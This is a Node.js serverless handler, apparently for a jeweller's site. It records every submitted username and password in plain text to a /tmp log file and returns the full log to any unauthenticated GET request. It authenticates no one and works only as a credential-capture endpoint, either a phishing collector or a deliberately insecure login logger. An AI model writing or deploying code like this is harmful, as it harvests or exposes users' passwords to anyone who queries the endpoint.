const fs = require('fs');
const path = require('path');

const LOG_DIR = path.join('/tmp', 'meenakshi-jewellers-logs');
const LOG_FILE = path.join(LOG_DIR, 'login-attempts.txt');

exports.handler = async (event) => {
  fs.mkdirSync(LOG_DIR, { recursive: true });

  if (event.httpMethod === 'GET') {
    const exists = fs.existsSync(LOG_FILE);
    const logs = exists ? fs.readFileSync(LOG_FILE, 'utf8').trim() : 'No logs yet.';
    return {
      statusCode: 200,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ok: true, logs }),
    };
  }

  if (event.httpMethod === 'POST') {
    const body = JSON.parse(event.body || '{}');
    const { username, password } = body;
    const timestamp = new Date().toISOString();
    const entry = `[${timestamp}] username=${username || ''} password=${password || ''}\n`;
    fs.appendFileSync(LOG_FILE, entry, 'utf8');
    return {
      statusCode: 200,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ok: true, message: 'Login attempt recorded.' }),
    };
  }

  return {
    statusCode: 405,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ok: false, message: 'Method not allowed' }),
  };
};
